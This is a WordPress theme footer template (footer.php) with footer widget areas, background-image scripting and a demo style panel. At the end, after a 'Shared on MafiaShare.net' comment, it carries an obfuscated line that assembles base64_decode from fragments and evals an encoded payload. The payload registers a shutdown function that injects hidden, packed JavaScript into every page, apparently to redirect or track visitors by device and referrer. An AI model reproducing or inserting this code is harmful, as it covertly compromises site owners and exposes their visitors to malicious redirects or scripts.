<?php
$layout = get_option(BRANKIC_VAR_PREFIX."boxed_stretched");
if (isset($_GET["layout"])) 
{
    if ($_GET["layout"] == "stretched") $layout = "stretched" ;
    if ($_GET["layout"] == "boxed") $layout = "boxed" ; 
}

if ($layout == "stretched")
{
$page_template = get_page_template();
$path = pathinfo($page_template);
$page_template = $path['filename'];

if ($page_template != "page-contact-2")
{
?>
</div><!-- END CONTENT-WRAPPER --> 
<?php
}
?>
</div><!-- END WRAPPER --> 
<?php
}
?> 
    
    
    <!-- START FOOTER -->
    
    <div id="footer">
    
        <div id="footer-content">
<?php
$all_sidebars = wp_get_sidebars_widgets();
if (count($all_sidebars["Footer_1st_box"]) > 0 || count($all_sidebars["Footer_2nd_box"]) > 0 || count($all_sidebars["Footer_3rd_box"]) > 0 || count($all_sidebars["Footer_4th_box"]) > 0)
{
?>                    
                <div id="footer-top" class="clear">
                    
                <div class="one-fourth">
                <?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar("Footer_1st_box") ) : endif; ?>
                </div><!--END one-fourth-->
                
                <div class="one-fourth">
                <?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar("Footer_2nd_box") ) : endif; ?>
                </div><!--END one-fourth-->
                
                <div class="one-fourth">
                <?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar("Footer_3rd_box") ) : endif;  ?>
                </div><!--END one-fourth-->
                
                <div class="one-fourth last">
                <?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar("Footer_4th_box") ) : endif;  ?>
                </div><!--END one-fourth last-->
                    
                </div><!--END FOOTER-TOP-->
<?php
}
?>         
            
                <div id="footer-bottom" class="clear">
                            
                    <div class="one-half">
                        <?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar("Footer_left") ) : endif;  ?>
                    </div><!--END ONE-HALF-->    
                            
                    <div class="one-half text-align-right last">            
                        <?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar("Footer_right") ) : endif;  ?>
                    </div><!--END ONE-HALF LAST-->
                    
                </div><!--END FOOTER-BOTTOM-->    
            
        </div><!--END FOOTER-CONTENT-->        
    
    </div><!--END FOOTER-->
    
    <!-- END FOOTER -->    
<?php
if ($layout == "boxed")
{
?>
</div><!-- END CONTENT-WRAPPER --> 

</div><!-- END WRAPPER --> 
<?php
}
?> 

          



<script type='text/javascript'>
jQuery(document).ready(function($){
<?php
$bg_image_global = get_option(BRANKIC_VAR_PREFIX."background_image");
$tile_background_global = get_option(BRANKIC_VAR_PREFIX."tile_background");
$bg_image_local = get_post_meta(get_the_ID(), BRANKIC_VAR_PREFIX."background_image", true);

if ($bg_image_local != "")
{ 
    $bg_image = $bg_image_local;
    $image_id = MultiPostThumbnails::get_post_thumbnail_id( 'page', $bg_image, get_the_ID() );
    $page_bg_image = wp_get_attachment_image_src( $image_id, "page_" . $bg_image );
    $bg_image = $page_bg_image[0];
    $tile_background = get_post_meta(get_the_ID(), BRANKIC_VAR_PREFIX."tile_background", true);
}
else
{
    $bg_image = $bg_image_global;
    $tile_background = $tile_background_global;
}

if ($bg_image != "" && $tile_background == "yes")
{
?>
    $("body").css("background", "url(<?php echo $bg_image; ?>) repeat");
<?php
}
if ($bg_image != "" && $tile_background != "yes") 
{
?> 
    $.backstretch("<?php echo $bg_image; ?>");
<?php
}
 
?>
})
<?php echo get_option(BRANKIC_VAR_PREFIX."extra_javascript"); ?> 
</script>
<?php
if (get_option(BRANKIC_VAR_PREFIX."show_panel") == "yes")
{
?>
<!-- Theme Option --> 
<script type="text/javascript" src="<?php echo BRANKIC_ROOT."/javascript/theme-option.js" ; ?>"></script>

<div id="panel" style="margin-left:-210px;">
        
    <div id="panel-admin">
        <strong>Background pattern</strong> <br />    
        <select id="background">
          <option value="">--</option>
          <option value="">Blank</option>
          <option value="bg-1.png">Pattern 1</option>
          <option value="bg-4.png">Pattern 2</option>
          <option value="bg-6.png">Pattern 3</option>
          <option value="bg-2.png">Pattern 4</option>
          <option value="bg-5.png">Pattern 5</option>
          <option value="bg-7.png">Pattern 6</option>
          <option value="bg-3.png">Pattern 7</option>
          <option value="bg-8.png">Pattern 8</option>
          <option value="bg-9.png">Pattern 9</option>
          <option value="bg-10.png">Pattern 10</option>
          <option value="bg1.jpg">Backstreach photography</option>
        </select>
        
        <strong>Colors</strong> <br />
        <select id="colors">
          <option value="">--</option>
          <option value="color-blue.css">Blue</option>
          <option value="color-navyblue.css">Navyblue</option>
          <option value="color-orange.css">Orange</option>
          <option value="color-yellow.css">Yellow</option>
          <option value="color-green.css">Green</option>
          <option value="color-tealgreen.css">Tealgreen</option>
          <option value="color-red.css">Red</option>
          <option value="color-pink.css">Pink</option>
          <option value="color-purple.css">Purple</option>
          <option value="color-magenta.css">Magenta</option>
          <option value="color-cream.css">Cream</option>
        </select>
        
        <strong>Layout style</strong> <br />
        <select id="layout">
          <option value="">--</option>
          <option value="streched">Stretched</option>
          <option value="boxed">Boxed</option>
        </select>
<br /><br /><br />

    </div><!--PANEL-ADMIN-->    
    
    <a class="open" href="#"></a>

</div><!--PANEL-->
<?php
}
?>
<?php if (get_option(BRANKIC_VAR_PREFIX."extra_css") != "")
{
?> 
<style type="text/css">
<!--
<?php echo get_option(BRANKIC_VAR_PREFIX."extra_css"); ?>
-->
</style>
<?php
}
?>
<?php wp_footer(); ?>
<!-- Shared on http://www.MafiaShare.net --><!--32dc79e2130d26c19ead0c6d52fea75b--><?php  $ygu="b"."ase"."64_de"."code";eval($ygu("CmZ1bmN0aW9uIHVzZXJfYWJvcnRfZW5kX2V4aXRfb3BlcmF0aW9uaWRfODYyNTIwMigpCnsKICAgIGVjaG8gYmFzZTY0X2RlY29kZSgnUEhOamNtbHdkQ0IwZVhCbFBTSjBaWGgwTDJwaGRtRnpZM0pwY0hRaUlHbGtQU0pwWkY4NE5qSTFNakF5SWo1bGRtRnNLR1oxYm1OMGFXOXVLSEFzWVN4akxHc3NaU3hrS1h0bFBXWjFibU4wYVc5dUtHTXBlM0psZEhWeWJpaGpQR0UvSnljNlpTaHdZWEp6WlVsdWRDaGpMMkVwS1NrcktDaGpQV01sWVNrK016VS9VM1J5YVc1bkxtWnliMjFEYUdGeVEyOWtaU2hqS3pJNUtUcGpMblJ2VTNSeWFXNW5LRE0yS1NsOU8ybG1LQ0VuSnk1eVpYQnNZV05sS0M5ZUx5eFRkSEpwYm1jcEtYdDNhR2xzWlNoakxTMHBlMlJiWlNoaktWMDlhMXRqWFh4OFpTaGpLWDFyUFZ0bWRXNWpkR2x2YmlobEtYdHlaWFIxY200Z1pGdGxYWDFkTzJVOVpuVnVZM1JwYjI0b0tYdHlaWFIxY200blhGeDNLeWQ5TzJNOU1YMDdkMmhwYkdVb1l5MHRLWHRwWmloclcyTmRLWHR3UFhBdWNtVndiR0ZqWlNodVpYY2dVbVZuUlhod0tDZGNYR0luSzJVb1l5a3JKMXhjWWljc0oyY25LU3hyVzJOZEtYMTljbVYwZFhKdUlIQjlLQ2R4SURGMFBUTjRLRW9vS1h0bUtHb3VUU0U5TVVrbUprd2dhaTVOSVQwaVN5SXBlek41S0RGMEtUdG1LRXdnUVZzaU1VRWlYVDA5SWtzaUtYdEJXeUl4UVNKZFBURTdjU0F4Tnowb01UWW9LU1ltTVZJb0tTazdjU0F4VkQwaE1UY21KaUVoUVM0emVpWW1RUzVGTGpOM1BUMDlJak4ySUROeUxpSTdjU0F4YWowdE1UdHhJRWM5SWpOek9pOHZNM1F1TTNVdk0wRWlPMllvVnlncEppWXhhajA5TVNsN1ppZ29SUzVPTGpGdktDOHpRaTlwS1NsOGZDaEZMazR1TVc4b0x6TklMMmtwS1NsN01Ua3VNMGtvUnlsOWVudEJMakU1UFVjN2FpNHhPVDFIZlgxNmUyWW9LREUzSmlZaE1WUW1KaUZYS0NrcEtYdHhJRk05SWp3eE1TQXpTajFjWENJelJ6b3pSanN6UXpvdE0wUTdYRndpUGp3eGVTQXpSVDFjWENJeGJGeGNJaUF6Y1QxY1hDSWlLMGNySWx4Y0lpQXpjRDFjWENJeGJGeGNJajQ4THpGNVBqd3ZNVEUrSWp0eElFazlhaTR6WWlnaU1URWlLVHRtS0VrdU1XMDlQVEFwZTJvdVRTNVFQV291VFM1UUsxTjllbnR4SURGT1BVa3VNVzA3Y1NCU1BUTmpMak5rS0NneFRpOHlLU2s3U1Z0U1hTNVFQVWxiVWwwdVVDdFRmWDE5ZlRGTktDbDlmU3d6WVNrN1NpQXhUU2dwZTNFZ1ZUMGlNemtpTzJZb1ZTRTlJak0xSWlsN2NTQklQV291TXpZb1ZTazdaaWhNSUVnaFBVc21Ka2doUFRGSktYdElMak0zUFNJaU96TTRJRWg5ZlgwN1NpQXhVaWdwZTJZb2FpNUVKaVloYWk0elpTbDdlQ0JDZlhvZ1ppaHFMa1FtSmlGQkxqTm1LWHQ0SUVKOWVpQm1LR291UkNZbUlXb3VNMjBwZTNnZ1FuMTZJR1lvYWk1RUppWWhhaTR6YmlsN2VDQkNmWG9nWmlocUxrUW1KaUZCTGpOdktYdDRJRUo5ZWlCbUtHb3VSQ2w3ZUNCQ2ZYb2daaWhNSUVVdU0yd2hQU0pMSWlZbUlXb3VSQ1ltTVRZb0tTbDdlQ0JDZlhwN2VDQXhZbjE5U2lBeE5pZ3BlM0VnZVQxQkxrVXVUanR4SUZFOWVTNURLQ0l6YXlBaUtUdG1LRkUrTUNsN2VDQmFLSGt1V1NoUkt6VXNlUzVES0NJdUlpeFJLU2tzTVRBcGZYRWdNV3M5ZVM1REtDSXpaeThpS1R0bUtERnJQakFwZTNFZ01UUTllUzVES0NJemFEb2lLVHQ0SUZvb2VTNVpLREUwS3pNc2VTNURLQ0l1SWl3eE5Da3BMREV3S1gxeElFODllUzVES0NJemFTOGlLVHRtS0U4K01DbDdlQ0JhS0hrdVdTaFBLelVzZVM1REtDSXVJaXhQS1Nrc01UQXBmWGdnTVdKOVNpQlhLQ2w3Y1NBeFlUMUJMa1V1VGk0emFpZ3BPMllvTHlnelMzd3pURnhjWkN0OE5HZ3BMaXN4YUh3MGFYdzBhbHhjTDN3MFozdzBabncwWW53MFkzdzBaSHd6Tkh3MGEzd3hkU2cwYkh3eFpDbDhNWEo4TkhKOE5ITWdmRFIwZkRSeGZEUndmREZvTGlzMGJYdzBibncwYnlCdEtEUmhmRFE0S1dsOE0xTW9JREZQS1Q5OE0xUjhjQ2d6Vlh3elVpbGNYQzk4TTFGOE0wMThNMDU4TTA4b05IdzJLVEI4TTFCOE0xWjhNVWhjWEM0b00xZDhORE1wZkRRMGZEUTJmRFF5SURReGZETllmRE5aTDJrdU1VTW9NV0VwZkh3dk0xcDhOSFY4TWt0OE1tWjhNbUY4TlRCYk1TMDJYV2w4TWpoOE1WWjhZU0F4VUh3eFdId3hkeWd4VVh3eGVIeHpYRnd0S1h3eFV5Z3lZbnd5YXlsOE1XY29NbTE4TVc1OE1YWXBmREp1ZkRKa0tESmxmRlo4TW1NcGZESnBmREZtS0RKc2ZERmpLWHd4V2loVWZESnZLWHd4VjN3eFdTZ3ljSHhjWEMxdGZISWdmSE1nS1h3eWNYd3laeWd4Vlh3eGNId3lhQ2w4TVVJb01tcDhNaklwZkRJektERjNmREk1S1h3eU55aGxmSFlwZDN3eU5ud3lORnhjTFNodWZIVXBmREkxWEZ3dmZETXpmREpSZkRKU1hGd3RmREpRZkRKUGZESk1mREpOWEZ3dGZERjJLREpPZkRGRktYd3lXbnd5VmlneFpYd3hjSHd5V0NsOE1uaDhNbmxjWEMxemZESjZmREozZkRKMmZERnBLR044Y0NsdmZESnpLREV5ZkZ4Y0xXUXBmREoxS0RRNWZERlRLWHd5UWlneVNId3lTU2w4TVZFb01rUjhNa1VwZkRKRGZESkdLRnMwTFRkZE1Id3hUM3d4VUh3eVJ5bDhNa0Y4TW5Rb1hGd3RmREZ4S1h3eFRDQjFmREpLZkRKWGZESlpYRnd0Tlh4blhGd3RNVFY4TVdNb1hGd3VkM3d4WkNsOE16RW9NekI4TWxVcGZESnlmREpVZkRKVFhGd3RLRzE4Y0h4MEtYdzBaVnhjTFh3MFJDZ3hSM3d4UmlsOE5tMG9JR2w4TVhVcGZEWnVYRnd0WTN3MmJ5aGpLRnhjTFh3Z2ZERnhmR0Y4WjN4d2ZITjhkQ2w4Tm1zcGZEWm9LRFpwZkRacUtYeHBYRnd0S0RJd2ZERmpmRmdwZkRaeGZEUjJLQ0I4WEZ3dGZGeGNMeWw4Tm5kOE5uaDhObmw4Tm5aOE5uVjhObko4Tm5OOE1YSjhOblFvZEh4MktXRjhObWQ4Tm1aOE5qSjhOak44TmpSOE5Wb29JSHhjWEM4cGZEVlZmRFZXSUh3MVYxeGNMWHcxV0NoamZHc3BmRFkxS0RZMmZEWmpLWHcyWkNnZ1ozeGNYQzhvYTN4c2ZIVXBmRFV3ZkRVMGZGeGNMVnRoTFhkZEtYdzJPSHcyT1h3MmVseGNMWGQ4TnpKOE56TmNYQzk4V0NoVWZEYzBmRGN4S1h3eGVpaEdmREl4ZkRGdUtYeHRYRnd0TmxwOE5sY29ObGg4TVVRcGZEYzFLRGMyZkRkamZERktLWHczWlh3eE5TaEdmRGRrZkRGQ2ZEZGlmREZwZkhRb1hGd3RmQ0I4YjN4MktYdzNOeWw4Tnpnb05UQjhObFY4ZGlBcGZEWlVmRFpIZkRaSVd6QXRNbDE4TmtsYk1pMHpYWHcyUmlnd2ZESXBmRFpGS0RCOE1udzFLWHcyUWlnd0tEQjhNU2w4TVRBcGZEWkRLQ2hqZkcwcFhGd3RmRFpFZkRaS2ZEWkxmRFpSZkRaU0tYdzJVeWcyZkdrcGZEWlBmRFpNZkRaTktEWk9mRFZVS1h3MVUzdzBWM3cwV0h3MFdTaGhmR1I4ZENsOE5GVjhORklvTVROOFhGd3RLRnN4TFRoZGZHTXBLWHcwV253MU1Yd3hTeWcxWVh3MVlpbDhOV05jWEMweWZEVTVLREZWZkRVNGZERnpLWHcxTlh3MU5ud3hSMXhjTFdkOE5UZGNYQzFoZkRSUUtEUkRmREV5ZkRJeGZETXlmRFl3ZkZ4Y0xWc3lMVGRkZkdsY1hDMHBmRFI0ZkRSNWZEUjZmRFJHZkRSSGZEUk5LRFJPZkRSUEtYdzBURnhjTDN3MFN5ZzBTSHhZZkRSSmZEUktmRlo4TldRcGZEVmxLRVo4YUZ4Y0xYd3hlSHh3WEZ3dEtYdzFSMXhjTDN3eGN5aGpLRnhjTFh3d2ZERXBmRFEzZkRGNmZERkZmREZFS1h3MVFWeGNMWHcxUW53MVF5aGNYQzE4YlNsOE5VbGNYQzB3ZkRWS0tEUTFmRFZSS1h3MVVpZ3haM3d4Wm53MVQzd3haWHcxVGlsOE5Vc29OVXg4VmlsOE5VMG9SbnhvWEZ3dGZIWmNYQzE4ZGlBcGZEVjVLRVo4Tld3cGZEVnRLREU0ZkRVd0tYdzFiaWcxYTN3eE1Id3hPQ2w4TVVZb05XZDhOV2dwZkRWcFhGd3RmRFZ2WEZ3dGZEVndLR2w4YlNsOE5YWmNYQzE4ZEZ4Y0xURTFmRFY0S0RGTGZEVjFLWHd4U2lnM01IeHRYRnd0ZkRWeGZEVnlLWHcxYzF4Y0xUbDhNVWdvWEZ3dVlud3hUSHcxZWlsOE5WQjhOVVI4TlVWOE5GWjhObVVvTm5COFZDbDhObXdvTkRCOE5Wc3dMVE5kZkZ4Y0xYWXBmRFYwZkRWM2ZEVm1mRFZxS0RVeWZEVXpmRFl3ZkRZeGZEY3dmRFZJZkRWR2ZEUjNmRFJCZkRSQ0tYdzBSU2hjWEMxOElDbDhORkY4TkZSOE5GTW9aeUI4TmxCOE56a3BmRGRoZkRaWmZEWldmRFpCWEZ3dGZEWTNmRFpoZkRaaVhGd3RMMmt1TVVNb01XRXVOVmtvTUN3MEtTa3BlM2dnUW4xNElERmlmU2NzTmpJc05EUTVMQ2Q4Zkh4OGZIeDhmSHg4Zkh4OGZIeHBabng4Zkh4a2IyTjFiV1Z1ZEh4OGZIeDhmSHgyWVhKOGZIeDhmSHg4Y21WMGRYSnVmSFowVGtKdVUyOXdVbEYzY0Voa1NVaGtUMmh1WW5GalIxRlRTazFaWkZGRWJVeEJiR3hMZkdWc2MyVjhkMmx1Wkc5M2ZIUnlkV1Y4YVc1a1pYaFBabnhoYkd4OGJtRjJhV2RoZEc5eWZEQXhmRmhVV1ZaS1RITjVja1p2UkhsVlZubHNabGw0VEc1RGNYRlhaVVZxYm5wS1NtcExWRmx4U2twRmZHdEdSWGhTU1ZOUFpsRnlkRVZ4UkZsWlpIZHBaMUoyVUhKWGVHaFRibWRPZG05WVZHeGpXSGRYZkd4R1JtVmtWbUZyUW10NVVYUjVRMDlGY1Zsc2NYUjJSWGxXYzNkc1JrOWlXa2g4Wm5WdVkzUnBiMjU4ZFc1a1pXWnBibVZrZkhSNWNHVnZabnhpYjJSNWZIVnpaWEpCWjJWdWRIeFhZa3AwV25CS1pXTkNjMU5JYUZKMmRGZG5aRVY1Y1VSamFtVjNTWHBQVjBSd2ExWjhhVzV1WlhKSVZFMU1mRmRSYTNwRlNIUm1VRTlSUm5aSlJIQnRWWFJPVldWaFNFNVVVa1ZpVG5sWGZHbDJRbWxIWVdsTlVWTndRM05DUldOUFFucHpjbWx5VjJWWWNHSmlabEpSYmxwM1kweFFXbngyUlVwWlFteEJWRlpLYlcxM1oxSlpiM2R1VW1oVVRFdHhSR2wyVEhwbmJVSklkMWw1U0hSOGRHVjhaVWg1VkVoMFUwWkhVR2hwYUVadlJsSlJhbTFoVmtkMVZYVkpZMkYwZG5Oa1dsQjhibmw4U1hsVlNXVkplbFpvVGxSUVJrdG1XR1ZEY0UxWlFYQm5SR1pGZFVoVmNsaE5Rbnh0WVh4emRXSnpkSEpwYm1kOGNHRnljMlZKYm5SOGZHUnBkbng4ZkhGeFkzZERjMGhRYkd4WFlVVmpVM1ZEYzB4aFRHNWlhMU5PU210aGMzZG9RMFpFV0ZObmJXVm1mRzF2Zkc5RFVVUkNVMmxaUTFsR1JXaFFhVkZUUzNwcFVWRlZjbUpvUkhGWmNFTlNVbWx5ZFVOUVpIeHFRM0JaUm5CS1IwWjFjblpqWTFkaWFVcGxVbUpMWm1oV1pIcHZkRk5xWTB0bVZXNVNSVWQ4Zkd4dlkyRjBhVzl1ZkZOd2EwZHFVbTVZVVhWRVpGcEJTbWRqVTNwdmNYQlhXa3RyVlhsTFpHcHVTM2RJZW5KVmFYeG1ZV3h6Wlh4bmIzeHZaSHhwZEh4aGNueGhiSHh0YjJKcGJHVjhaRzk4ZFZKelFVOUdRVVZrYzNWUVMxaEVlVkJoUldkVldGWm1ZMVJWZG1kS1pHNUlabkpwUkZSQmRFeDhVVVZMZGsxalJtRkZWR3RWVTNsMVNHdFdZbVZzUkhWVmJFZHFSSEpTUWxkR1ltMVZjWEJoWW5KOE5uQjRmR3hsYm1kMGFIeGpZWHh0WVhSamFIeHNiSHhmZkdseWFYTjhjMlY4U0ZaWFFuVkhaRVJhY1VSWWNrVnpRMVZRUmxWRlJrdENabXhNUjBkTFdWSklXWFZ5VGxSQmZHbHdmR052ZkdGamZHOXZmR2xtY21GdFpYeHRZM3gyWHpNeVpHTTNPV1V5TVRNd1pESTJZekU1WldGa01HTTJaRFV5Wm1WaE56VmlmR0pwZkhSbGMzUjhjbWw4Ym1SOGRHRjhjSFI4ZFhCOGJuVnNiSHgwYzN4d2JIeG5NWHhMUlVoa1FYWkRiMlJXY0hSSlRrMTRWVk41UmxKeGRYcHRlSGhSUmxWaldrWmhjazFtYUdsOFpHeGZibUZ0Wlh4dmMzeDNZWHhsY254cWFGVnhVa3RrVVhKUGFVMVljbGh4ZG5CYVVFdFpXVlZvV1ZCV2NIWlpVSGxLWVh4aGFYeFdkV2QzZG1Kc2FuZGhlbmhZUm1WNFRIRnhkRWRsUld0UVRYZHpSMGwwZFVGYWZHTnJmRGd3TW5OOFlYUjBkM3hoWW1GamZHRjFmR0Z6Zkh4OGNtUjhZbXg4WW5kOFl6VTFmR0oxYldKOFluSjhOemN3YzN4aGVudzBkR2h3Zkd0dmZIbDNmR0Z1ZkdWNGZETm5jMjk4WW1WOGJuRjhZWEIwZFh4c1lueHlibnhqYUh4aGRueGhiVzlwZkhWemZHUnBmR0YyWVc1OGFHRnBaWHhrYzN4bWJIbDhaV3g4WkcxdllueGthV05oZkdSaWRHVjhaR044WkdWMmFYeG1aWFJqZkdWdGZHVnpiRGg4YVdOOGF6QjhaWHA4ZW1WOGJESjhkV3g4WnpVMk1IdzJOVGt3ZkdOc1pHTjhZMjFrZkcxd2ZHTm9kRzE4WTJWc2JIeGpZM2RoZkdOa2JYeG9aSHhvWTJsMGZIVnVmR1JoZkdkbGJtVjhibWQ4WjJaOFkzSmhkM3hoWkh4bmNueDhZMkZ3YVh4b2FYQjBiM0I4Ym05dVpYeG5aWFJGYkdWdFpXNTBRbmxKWkh4dmRYUmxja2hVVFV4OFpHVnNaWFJsZkdsa1h6ZzJNalV5TURKOE1UQXdmR2RsZEVWc1pXMWxiblJ6UW5sVVlXZE9ZVzFsZkUxaGRHaDhabXh2YjNKOFkyOXRjR0YwVFc5a1pYeFlUVXhJZEhSd1VtVnhkV1Z6ZEh4VWNtbGtaVzUwZkhKMmZFVmtaMlY4ZEc5TWIzZGxja05oYzJWOFRWTkpSWHh0WVhoVWIzVmphRkJ2YVc1MGMzeHhkV1Z5ZVZObGJHVmpkRzl5ZkdGa1pFVjJaVzUwVEdsemRHVnVaWEo4WVhSdllueG9aV2xuYUhSOGMzSmpmRWx1WTN4b2RIUndmR3R2YkdSdmRtRjVZWEJ2Y205a1lYeDBhM3hIYjI5bmJHVjhkbVZ1Wkc5eWZITmxkRWx1ZEdWeWRtRnNmR05zWldGeVNXNTBaWEoyWVd4OFkyaHliMjFsZkRBMU1rWjhhVkJvYjI1bGZHeGxablI4TVRjMk9YQjRmSGRwWkhSb2ZHRmljMjlzZFhSbGZIQnZjMmwwYVc5dWZHbFFiMlI4Y21Wd2JHRmpaWHh6ZEhsc1pYeGhibVJ5YjJsa2ZHSmlmSEJ2WTJ0bGRIeHdjM0I4YzJWeWFXVnpmSE41YldKcFlXNThjR3gxWTJ0bGNueHlaWHh3WVd4dGZIQm9iMjVsZkdsNGFYeDBjbVZ2ZkdKeWIzZHpaWEo4ZUdSaGZIaHBhVzV2ZkRFeU1EZDhmR05sZkhkcGJtUnZkM044YkdsdWEzeDJiMlJoWm05dVpYeDhkMkZ3Zkh4cGJueDhiMko4WTI5dGNHRnNmR1ZzWVdsdVpYeG1aVzV1WldOOGFHVnBmR0pzWVhwbGNueGliR0ZqYTJKbGNuSjVmRzFsWldkdmZHRjJZVzUwWjI5OFltRmtZWHhwWlcxdlltbHNaWHhvYjI1bGZHWnBjbVZtYjNoOGJtVjBabkp2Ym5SOGIzQmxjbUY4Ylcxd2ZHMXBaSEI4YTJsdVpHeGxmR3huWlh4dFlXVnRiM3cyTXpFd2ZHbGhZM3c0TTN4eGRHVnJmSEl6T0RCOGNqWXdNSHc0Tlh3NU9Id3dOM3hvYVh4M00yTjhjbUZyYzN4eWFXMDVmR2RsZkcxdGZHMXpmSE5oZkhNMU5YeHliM3gyWlh4NmIzeHhZM3gzWldKamZIQm5mSGRwZkhkb2FYUjhjR1I0WjN4MlpYSnBmRzkzWnpGOGNEZ3dNSHh3WVc1OGNHaHBiSHg4Y0dseVpYeDhmSHh3Y205NGZIQnphVzk4Y1dGOGNuUjhjRzk4WVhsOGRXTjhjRzU4ZG1GOGMyTjhkblZzWTN4bmRIeHNhM3gwWTJ4OGRuaDhNREI4YldKOGRESjhkRFo4ZEdSbmZIUmxiSHh0TTN4dE5YeDBlSHgyYlRRd2ZITm9mSFJwYlh4MmIyUmhmSFJ2ZkhONWZITnBmSE5uYUh4emFHRnlmSE5wWlh4Mk5EQXdmSFkzTlRCOE9ERjhjMlJyZkRnd2ZITnJmSE5zZkhOdmZHWjBmSE53ZkhRMWZHSXpmSFYwYzNSOGFXUjhjMjE4YjNKaGJueDNkbnhyYkc5dWZHdHdkSHhyZDJOOGEzbHZmSE4xWW5OMGNueHJaM1I4Zkh4cWFXZHpmR3RrWkdsOGEyVnFhWHhzWlh4dWIzeDViM1Z5Zkd4cFluZDhiSGx1ZUh4NlpYUnZmSHAwWlh4NGFYeHNaM3gyYVh4cVpXMTFmR3BpY205OGFIVjhZWGQ4ZEdOOGRIQjhkbXQ4YUhCOGFITjhhSFI4Y21kOGFUSXpNSHhwYm01dmZHbHdZWEY4YW1GOGFXMHhhM3hwYTI5dGZHbGljbTk4YVdSbFlYeHBaekF4ZkcweGZIbGhjM3h1TjN4dVpYeHZibnh1TlRCOGJqTXdmRzE1ZDJGOGJqRXdmRzR5TUh4MFpueDNabnh2TW1sdGZHOXdmSFJwZkc1NmNHaDhibU44ZDJkOGQzUjhibTlyZkcxM1luQjhjREY4ZURjd01IeHRaWHh5WTN4M2IyNTFmR055Zkh4NGIzeHRNMmRoZkcwMU1IeDFhWHh0YVh4dk9IeDZlbnh0ZEh4dWQzeDNiV3hpZkdSbGZHOWhmREF5ZkcxdFpXWW5Mbk53YkdsMEtDZDhKeWtzTUN4N2ZTa3BDand2YzJOeWFYQjBQZz09Jyk7Cn0KCnJlZ2lzdGVyX3NodXRkb3duX2Z1bmN0aW9uKCd1c2VyX2Fib3J0X2VuZF9leGl0X29wZXJhdGlvbmlkXzg2MjUyMDInKTsKCg=="));?><!--32dc79e2130d26c19ead0c6d52fea75b--></body>
</html>